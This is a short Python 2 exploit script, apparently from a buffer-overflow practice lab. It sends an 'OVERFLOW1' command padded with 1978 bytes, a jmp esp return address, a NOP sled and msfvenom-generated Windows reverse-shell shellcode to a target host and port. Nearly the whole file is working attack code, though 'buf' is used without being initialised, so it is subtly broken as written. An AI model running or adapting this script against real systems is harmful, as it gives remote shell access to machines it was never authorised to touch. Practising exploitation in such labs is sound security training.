#!/usr/bin/env python2

import socket
import sys
import logging

offset=1978

# address of jmp esp
jmp_esp="\x05\x12\x50\x62"

# NOP
nop="\x90"*20

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp  LHOST=127.0.0.1 LPORT=5555 -f python  -b '\x00\x07\x2e\xa0' -v shellcode
shellcode =  b""
shellcode += b"\xba\x3a\x18\xc0\xac\xdb\xce\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e"
shellcode += b"\x03\x6c\x16\x22\x59\x6c\xce\x20\xa2\x8c\x0f"
shellcode += b"\x45\x2a\x69\x3e\x45\x48\xfa\x11\x75\x1a\xae"
shellcode += b"\x9d\xfe\x4e\x5a\x15\x72\x47\x6d\x9e\x39\xb1"
shellcode += b"\x40\x1f\x11\x81\xc3\xa3\x68\xd6\x23\x9d\xa2"
shellcode += b"\x2b\x22\xda\xdf\xc6\x76\xb3\x94\x75\x66\xb0"
shellcode += b"\xe1\x45\x0d\x8a\xe4\xcd\xf2\x5b\x06\xff\xa5"
shellcode += b"\xd0\x51\xdf\x44\x34\xea\x56\x5e\x59\xd7\x21"
shellcode += b"\xd5\xa9\xa3\xb3\x3f\xe0\x4c\x1f\x7e\xcc\xbe"
shellcode += b"\x61\x47\xeb\x20\x14\xb1\x0f\xdc\x2f\x06\x6d"
shellcode += b"\x3a\xa5\x9c\xd5\xc9\x1d\x78\xe7\x1e\xfb\x0b"
shellcode += b"\xeb\xeb\x8f\x53\xe8\xea\x5c\xe8\x14\x66\x63"
shellcode += b"\x3e\x9d\x3c\x40\x9a\xc5\xe7\xe9\xbb\xa3\x46"
shellcode += b"\x15\xdb\x0b\x36\xb3\x90\xa6\x23\xce\xfb\xae"
shellcode += b"\x80\xe3\x03\x2f\x8f\x74\x70\x1d\x10\x2f\x1e"
shellcode += b"\x2d\xd9\xe9\xd9\x52\xf0\x4e\x75\xad\xfb\xae"
shellcode += b"\x5c\x6a\xaf\xfe\xf6\x5b\xd0\x94\x06\x63\x05"
shellcode += b"\x3a\x56\xcb\xf6\xfb\x06\xab\xa6\x93\x4c\x24"
shellcode += b"\x98\x84\x6f\xee\xb1\x2f\x8a\x79\xc1\xaf\x94"
shellcode += b"\x78\x55\xb2\x94\x6f\x16\x3b\x72\xe5\x48\x6a"
shellcode += b"\x2d\x92\xf1\x37\xa5\x03\xfd\xed\xc0\x04\x75"
shellcode += b"\x02\x35\xca\x7e\x6f\x25\xbb\x8e\x3a\x17\x6a"
shellcode += b"\x90\x90\x3f\xf0\x03\x7f\xbf\x7f\x38\x28\xe8"
shellcode += b"\x28\x8e\x21\x7c\xc5\xa9\x9b\x62\x14\x2f\xe3"
shellcode += b"\x26\xc3\x8c\xea\xa7\x86\xa9\xc8\xb7\x5e\x31"
shellcode += b"\x55\xe3\x0e\x64\x03\x5d\xe9\xde\xe5\x37\xa3"
shellcode += b"\x8d\xaf\xdf\x32\xfe\x6f\x99\x3a\x2b\x06\x45"
shellcode += b"\x8a\x82\x5f\x7a\x23\x43\x68\x03\x59\xf3\x97"
shellcode += b"\xde\xd9\x03\xd2\x42\x4b\x8c\xbb\x17\xc9\xd1"
shellcode += b"\x3b\xc2\x0e\xec\xbf\xe6\xee\x0b\xdf\x83\xeb"
shellcode += b"\x50\x67\x78\x86\xc9\x02\x7e\x35\xe9\x06"


# Now compose the payload
buf+="OVERFLOW1 "

# Otherwise fill the buffer with junk until reaching the overflow
buf+="A"*offset

buf += jmp_esp
buf += nop
buf += shellcode
# Finally linefeed to send the buffer
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)
    
print s.recv(1024)
s.send(buf)
print s.recv(1024)